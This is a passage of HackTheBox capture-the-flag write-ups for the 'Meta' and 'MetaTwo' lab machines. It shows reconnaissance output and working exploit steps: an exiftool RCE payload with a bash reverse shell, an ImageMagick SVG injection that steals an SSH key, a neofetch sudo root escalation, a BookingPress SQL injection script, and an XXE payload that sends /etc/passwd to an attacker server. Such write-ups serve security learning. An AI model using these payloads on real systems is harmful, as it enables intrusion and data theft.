latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)\n|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)\n|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)\n80/tcp open  http    Apache httpd\n|_http-server-header: Apache\n|_http-title: Did not follow redirect to http://artcorp.htb\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.97 seconds\n</code></pre> <p>Just port 22 and 80 openned so let's start with the web server.</p>"},{"location":"HackTheBox/Meta/#artcorp-webpage","title":"Artcorp Webpage","text":""},{"location":"HackTheBox/Meta/#initial-enumeration","title":"Initial Enumeration","text":"<p>First thing, the page is redirecting to <code>http://artcorp.htb/</code> to added the domain to my <code>/etc/hosts</code> file in order to access.</p> <p>Since the page looks pretty empty I launched a <code>Gobuster</code> directory scan to check for something useful:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Meta]\n\u2514\u2500$ gobuster dir -u http://artcorp.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://artcorp.htb/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              html\n[+] Timeout:                 10s\n===============================================================\n2022/05/29 04:24:38 Starting gobuster in directory enumeration mode\n===============================================================\n/index.html           (Status: 200) [Size: 4427]\n/assets               (Status: 301) [Size: 234] [--&gt; http://artcorp.htb/assets/]\n/css                  (Status: 301) [Size: 231] [--&gt; http://artcorp.htb/css/]   \n\n===============================================================\n2022/05/29 04:29:10 Finished\n===============================================================\n</code></pre> <p>No luck there but what about virtual hosts?</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/Meta]\n\u2514\u2500$ gobuster vhost -u http://artcorp.htb/ -w ~/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:          http://artcorp.htb/\n[+] Method:       GET\n[+] Threads:      10\n[+] Wordlist:     /home/kali/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt\n[+] User Agent:   gobuster/3.1.0\n[+] Timeout:      10s\n===============================================================\n2022/05/29 04:27:59 Starting gobuster in VHOST enumeration mode\n===============================================================\nFound: dev01.artcorp.htb (Status: 200) [Size: 247]\n\n===============================================================\n2022/05/29 04:30:01 Finished\n===============================================================\n</code></pre> <p>There you go, adding the discovered subdomain to <code>/etc/hosts</code> file we are welcomed with a simple page that allow us to test application under development. Only one available, MetaView, the one the main page was talking about so let's take a look.</p>"},{"location":"HackTheBox/Meta/#rce","title":"RCE","text":"<p>The application allow us to upload a file and the page will show the metada information of it. Trying to add metada to a JPG image I noticed that I could get XSS, not usefull but hey it is something: <pre><code>exiftool -overwrite_original -artist=\"&lt;h1&gt;TEST&lt;/h1&gt;\" exploit.jpg\n</code></pre></p> <p>Also I tried to inject a PHP payload but looks like the application is filtering it out. I tried for a while and even though I was not able to bypass the filter I found something while I was crying: https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/.</p> <p>The page output looks really like <code>exiftool</code> being used to get the metada information so, maybe this RCE exploit could work. I replicated the PoC and generated a malicious image <code>exploit.jpg</code>: <pre><code># Payload file\n(metadata \"\\c${system('id')};\")\n\n# Compress the payload and create a DjVu image\nbzz payload payload.bzz\ndjvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz\n\n\n#Create this configfile file for exiftool\n%Image::ExifTool::UserDefined = (\n    # All EXIF tags are added to the Main table, and WriteGroup is used to\n    # specify where the tag is written (default is ExifIFD if not specified):\n    'Image::ExifTool::Exif::Main' =&gt; {\n        # Example 1.  EXIF:NewEXIFTag\n        0xc51b =&gt; {\n            Name =&gt; 'HasselbladExif',\n            Writable =&gt; 'string',\n            WriteGroup =&gt; 'IFD0',\n        },\n        # add more user-defined EXIF tags here...\n    },\n);\n1; #end%\n\n# Using the configfile, inject the DjVu inside a JPG\nexiftool -config configfile '-HasselbladExif&lt;=exploit.djvu' -overwrite_original exploit.jpg\n</code></pre></p> <p>Uploading that file to the application will result in the <code>id</code> command being executed so we have RCE! We can now leverage this to get a reverse shell:</p> <pre><code>(metadata \"\\c${system('bash', '-c', 'bash -i &gt;&amp; /dev/tcp/10.10.14.12/8080 0&gt;&amp;1')};\")\n</code></pre>"},{"location":"HackTheBox/Meta/#in-the-machine-as-www-data","title":"In the machine as www-data","text":"<p>Using Pspy64 I saw that there are some funny things going on here:</p> <pre><code>2022/05/29 08:08:01 CMD: UID=0    PID=15560  | /bin/sh -c rm /tmp/* \n2022/05/29 08:08:01 CMD: UID=0    PID=15564  | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf \n2022/05/29 08:08:01 CMD: UID=1000 PID=15563  | /usr/local/bin/mogrify -format png *.* \n2022/05/29 08:08:01 CMD: UID=1000 PID=15561  | /bin/bash /usr/local/bin/convert_images.sh \n2022/05/29 08:08:01 CMD: UID=1000 PID=15566  | pkill mogrify\n</code></pre> <p>Looks like the user 1000 (<code>thomas</code>), is running this script as a Cronjob:</p> <pre><code>#!/bin/bash\ncd /var/www/dev01.artcorp.htb/convert_images/ &amp;&amp; /usr/local/bin/mogrify -format png *.* 2&gt;/dev/null\npkill mogrify\n</code></pre> <p>And also that the box love to delete things and move stuff around, this cost me some hours to be honest. Researchin about that <code>mogrify</code> thing I found this blog about a vulnerability that can be used to inject commands using a malicious SVG file, this the one I used:</p> <pre><code>&lt;image authenticate='ff\" `echo $(cat /home/thomas/.ssh/id_rsa)&gt; /home/thomas/0wned`;\"'&gt;\n  &lt;read filename=\"pdf:/etc/passwd\"/&gt;\n  &lt;get width=\"base-width\" height=\"base-height\" /&gt;\n  &lt;resize geometry=\"400x400\" /&gt;\n  &lt;write filename=\"test.png\" /&gt;\n  &lt;svg width=\"700\" height=\"700\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"&gt;       \n  &lt;image xlink:href=\"msl:poc.svg\" height=\"100\" width=\"100\"/&gt;\n  &lt;/svg&gt;\n&lt;/image&gt;\n</code></pre> <p>At first I tested this trying to write the command output to the <code>/tmp</code> folder but thanks to the box cleaning up stuff I wasted a lot of time \"debugging\" something that was working. At the end I came up with the above payload and I was able to get the private key of the user, it needed some formatting but I got an SSH session with it at the end.</p>"},{"location":"HackTheBox/Meta/#in-the-machine-as-thomas","title":"In the machine as thomas","text":"<p>First of all, get the user flag under <code>/home/thomas/user.txt</code>.</p> <pre><code>2022/05/29 08:08:01 CMD: UID=0    PID=15564  | /bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf \n</code></pre> <p>Then I found something interesting:</p> <pre><code>thomas@meta:~$ sudo -l\nMatching Defaults entries for thomas on meta:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    env_keep+=XDG_CONFIG_HOME\n\nUser thomas may run the following commands on meta:\n    (root) NOPASSWD: /usr/bin/neofetch \\\"\\\"\n</code></pre> <p>Looks like this user is able to execute the <code>neofetch</code> command as <code>root</code>. According with the research I made, we can use this to get a shell as <code>root</code> using a configuration file with this content:</p> <pre><code>exec /bin/sh\n</code></pre> <p>The problem is that we can't specify a custom configuration file in the command but we can use the <code>XDG_CONFIG_HOME</code> environment variable. According to the documentation, Neofetch will use the file under <code>$XDG_CONFIG_HOME/neofetch/config.conf</code> and <code>sudo</code> is also configured to keep the <code>XDG_CONFIG_HOME</code> variable if present. </p> <p>With that information, I created <code>/home/thomas/neofetch/config.conf</code> and got a <code>root</code> shell:</p> <pre><code>thomas@meta:~$ cat neofetch/config.conf \nexec /bin/sh\nthomas@meta:~$ sudo XDG_CONFIG_HOME=$HOME /usr/bin/neofetch \n# id\nuid=0(root) gid=0(root) groups=0(root)\n#\n</code></pre> <p>The <code>root</code> flag is under <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/MetaTwo/","title":"MetaTwo","text":""},{"location":"HackTheBox/MetaTwo/#nmap","title":"Nmap","text":"<p>Let's start with an Nmap scan as usual: </p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap --min-rate 1000 -p- 10.129.232.102\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 00:16 EDT\nNmap scan report for 10.129.232.102\nHost is up (0.061s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 28.00 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -sC -sV -p21,22,80 10.129.232.102                      \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-10-31 00:19 EDT\nStats: 0:03:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan\nNSE Timing: About 99.76% done; ETC: 00:22 (0:00:00 remaining)\nNmap scan report for 10.129.232.102\nHost is up (0.053s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp?\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)\n|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)\n|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)\n80/tcp open  http    nginx 1.18.0\n|_http-title: Did not follow redirect to http://metapress.htb/\n|_http-server-header: nginx/1.18.0\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 230.36 seconds\n</code></pre> <p>Only 3 ports open, I will start with the port 80 because the rest of them will probably require authentication.</p>"},{"location":"HackTheBox/MetaTwo/#port-80","title":"Port 80","text":"<p>It is redirecting to http://metapress.htb/ so I added it to my <code>/etc/hosts</code> file. According to the source code of the page, looks like it is Wordpress 5.6.2 and looking around the articles I found something interesting: http://metapress.htb/events/. This page allows a user to register for an event, the plugin name is something like Bookingpress.</p> <p>I decided to throw WPScan at it with the plugins detection mode set to aggressive to check for installed plugins:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ wpscan --url http://metapress.htb/ --plugins-detection aggressive\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \u00ae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.22\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://metapress.htb/ [10.129.232.102]\n[+] Started: Mon Oct 31 00:33:32 2022\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entries:\n |  - Server: nginx/1.18.0\n |  - X-Powered-By: PHP/8.0.24\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] robots.txt found: http://metapress.htb/robots.txt\n | Interesting Entries:\n |  - /wp-admin/\n |  - /wp-admin/admin-ajax.php\n | Found By: Robots Txt (Aggressive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://metapress.htb/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).\n | Found By: Rss Generator (Passive Detection)\n |  - http://metapress.htb/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;\n |  - http://metapress.htb/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;\n\n[+] WordPress theme in use: twentytwentyone\n | Location: http://metapress.htb/wp-content/themes/twentytwentyone/\n | Last Updated: 2022-05-24T00:00:00.000Z\n | Readme: http://metapress.htb/wp-content/themes/twentytwentyone/readme.txt\n | [!] The version is out of date, the latest version is 1.6\n | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1\n | Style Name: Twenty Twenty-One\n | Style URI: https://wordpress.org/themes/twentytwentyone/\n | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n | Confirmed By: Css Style In 404 Page (Passive Detection)\n |\n | Version: 1.1 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'\n\n[+] Enumerating All Plugins (via Aggressive Methods)\n Checking Known Locations - Time: 00:35:47 &lt;===============================&gt; (100928 / 100928) 100.00% Time: 00:35:47\n[+] Checking Plugin Versions (via Passive and Aggressive Methods)\n\n[i] Plugin(s) Identified:\n\n[+] bookingpress-appointment-booking\n | Location: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/\n | Last Updated: 2022-10-22T14:11:00.000Z\n | Readme: http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt\n | [!] The version is out of date, the latest version is 1.0.45\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/, status: 200\n |\n | Version: 1.0.10 (100% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/readme.txt\n | Confirmed By: Translation File (Aggressive Detection)\n |  - http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/languages/bookingpress-appointment-booking-en_US.po, Match: 'sion: BookingPress Appointment Booking v1.0.10'\n\n[+] feed\n | Location: http://metapress.htb/wp-content/plugins/feed/\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://metapress.htb/wp-content/plugins/feed/, status: 200\n |\n | The version could not be determined.\n\n[+] leira-roles\n | Location: http://metapress.htb/wp-content/plugins/leira-roles/\n | Latest Version: 1.1.8.0 (up to date)\n | Last Updated: 2022-05-05T05:13:00.000Z\n | Readme: http://metapress.htb/wp-content/plugins/leira-roles/README.txt\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://metapress.htb/wp-content/plugins/leira-roles/, status: 200\n |\n | Version: 1.1.8.0 (100% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://metapress.htb/wp-content/plugins/leira-roles/README.txt\n | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\n |  - http://metapress.htb/wp-content/plugins/leira-roles/README.txt\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:02 &lt;======================================&gt; (137 / 137) 100.00% Time: 00:00:02\n\n[i] No Config Backups Found.\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Mon Oct 31 01:09:35 2022\n[+] Requests Done: 101088\n[+] Cached Requests: 43\n[+] Data Sent: 30.989 MB\n[+] Data Received: 36.31 MB\n[+] Memory used: 457.629 MB\n[+] Elapsed time: 00:36:02\n</code></pre> <p>The booking press plugin is vulnerable to SQL injection according to this article. First, we need a nonce that can be found searching for <code>bookingpress_front_get_category_services</code> in the source code of the page where the plugin code is embedded, in my case the nonce is <code>bf440717c1</code>. Now we can try the PoC:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=bf440717c1&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Mon, 31 Oct 2022 05:14:19 GMT\nContent-Type: text/html; charset=UTF-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nX-Powered-By: PHP/8.0.24\nX-Robots-Tag: noindex\nX-Content-Type-Options: nosniff\nExpires: Wed, 11 Jan 1984 05:00:00 GMT\nCache-Control: no-cache, must-revalidate, max-age=0\nX-Frame-Options: SAMEORIGIN\nReferrer-Policy: strict-origin-when-cross-origin\n\n[{\"bookingpress_service_id\":\"10.5.15-MariaDB-0+deb11u1\",\"bookingpress_category_id\":\"Debian 11\",\"bookingpress_service_name\":\"debian-linux-gnu\",\"bookingpress_service_price\":\"$1.00\",\"bookingpress_service_duration_val\":\"2\",\"bookingpress_service_duration_unit\":\"3\",\"bookingpress_service_description\":\"4\",\"bookingpress_service_position\":\"5\",\"bookingpress_servicedate_created\":\"6\",\"service_price_without_currency\":1,\"img_url\":\"http:\\/\\/metapress.htb\\/wp-content\\/plugins\\/bookingpress-appointment-booking\\/images\\/placeholder-img.jpg\"}]\n</code></pre> <p>It works! I wrote a little Python script to ease the injection process. I tried to enumerate the database a bit but could not found anything interesting, just the registered users and their hashes are worth it:</p> <pre><code>import requests\n\nurl = 'http://metapress.htb/wp-admin/admin-ajax.php'\n\nwhile True:\n    sql = input('Inject SQL: ')\n    if(sql == 'exit'):\n        break\n\n    data = {\n        'action': 'bookingpress_front_get_category_services',\n        '_wpnonce': 'bf440717c1',\n        'category_id': '33',\n        'total_service': f'-7502) UNION ALL SELECT 1,2,3,4,5,6,7,8,({sql})-- -'\n    }\n    response = requests.post(url, data=data)\n    if(response.ok):\n        json_response = response.json()\n        if(len(json_response)):\n            print(json_response[0]['bookingpress_servicedate_created'])\n        else:\n            print('SQL error!')\n</code></pre> <pre><code>Inject SQL: select group_concat(0x7c, user_login, 0x7c, user_pass, 0x7c) from wp_users\n|admin|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|,|manager|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|\n</code></pre> <p>Using John and the Rockyou dictionary I got the password for <code>manager</code> user: <code>partylikearockstar</code>. After login into the Wordpress dashboard, looks like the user has really low privileges. The only thing we can do is to upload media files but should be enough. The Wordpress version is vulnerable to CVE-2021-29447 so we should be able to exfiltrate files from the server. This is the payload I created following the article, the objective is to get the <code>/etc/passwd</code> file:</p> <pre><code>echo -en 'RIFF\\xb8\\x00\\x00\\x00WAVEiXML\\x7b\\x00\\x00\\x00&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '\"'\"'http://10.10.14.2:8080/evil.dtd'\"'\"'&gt;%remote;%init;%trick;]&gt;\\x00' &gt; payload.wav\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/MetaTwo(TODO)/www]\n\u2514\u2500$ cat evil.dtd               \n&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\"&gt;\n&lt;!ENTITY % init \"&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.2:8080/?p=%file;'&gt;\" &gt;\n</code></pre> <p>Uploading the payload with a web server hosting the <code>evil.dtd</code>, I got this request to my HTTP server:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/HTB/MetaTwo(TODO)/www]\n\u2514\u2500$ python3 -m http.server 8080\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n10.129.232.102 - - [31/Oct/2022 13:16:21] \"GET /evil.dtd HTTP/1.1\" 200 -\n10.129.232.102 - - [31/Oct/2022 13:16:21] \"GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo= HTTP/1.1\" 200 -\n</code></pre> <p>Decoding the base64 we get the <code>passwd</code> file of the machine so we can say that the exploit is working!</p> <pre><code>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsshd:x:104:65534::/run/sshd:/usr/sbin/nologin\njnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash\nsystemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin\nsystemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin\nmysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false\nproftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin\nftp:x:107:65534::/srv/ftp:/usr/sbin/nologin\n</code></pre> <p>I did the same thing with the Nginx configuration file <code>/etc/nginx/nginx.conf</code> to search for the Wordpress root directory:</p> <pre><code>user www-data;\nworker_processes auto;\npid /run/nginx.pid;\ninclude /etc/nginx/modules-enabled/*.conf;\n\nevents {\n    worker_connections 768;\n    # multi_accept on;\n}\n\nhttp {\n\n    ##\n    # Basic Settings\n    ##\n\n    sendfile on;\n    tcp_nopush on;\n    types_hash_max_size 2048;\n    # server_tokens off;\n\n    # server_names_hash_bucket_size 64;\n    # server_name_in_redirect off;\n\n    include /etc/nginx/mime.types;\n    default_type application/octet-stream;\n\n    ##\n    # SSL Settings\n    ##\n\n    ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE\n    ssl_prefer_server_ciphers on;\n\n    ##\n    # Logging Settings\n    ##\n\n    access_log /var/log/nginx/access.log;\n    error_log /var/log/nginx/error.log;\n\n    ##\n    # Gzip Settings\n    ##\n\n    gzip on;\n\n    # gzip_vary on;\n    # gzip_proxied any;\n    # gzip_comp_level 6;\n    # gzip_buffers 16 8k;\n    # gzip_http_version 1.1;\n    # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;\n\n    ##\n    # Virtual Host Configs\n    ##\n\n    include /etc/nginx/conf.d/*.conf;\n    include /etc/nginx/sites-enabled/*;\n}\n\n\n#mail {\n#   # See sample authentication script at:\n#   # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript\n#\n#   # auth_http localhost/auth.php;\n#   # pop3_capabilities \"TOP\" \"USER\";\n#   # imap_capabilities \"IMAP4rev1\" \"UIDPLUS\";\n#\n#   server {\n#       listen     localhost:110;\n#       protocol   pop3;\n#       proxy      on;\n#   }\n#\n#   server {\n#       listen     localhost:143;\n#       protocol   imap;\n#       proxy      on;\n#   }\n#}\n</code></pre> <p>From the above file, I saw that <code>/etc/nginx/sites-enabled/default</code> was propably what I was looking for:</p> <pre><code>server {\n\n    listen 80;\n    listen [::]:80;\n\n    root /var/www/metapress.htb/blog;\n\n    index index.php index.html;\n\n        if ($http_host != \"metapress.htb\") {\n                rewrite ^ http://metapress.htb/;\n        }\n\n    location / {\n        try_files $uri $uri/ /index.php?$args;\n    }\n\n    location ~ \\.php$ {\n        include 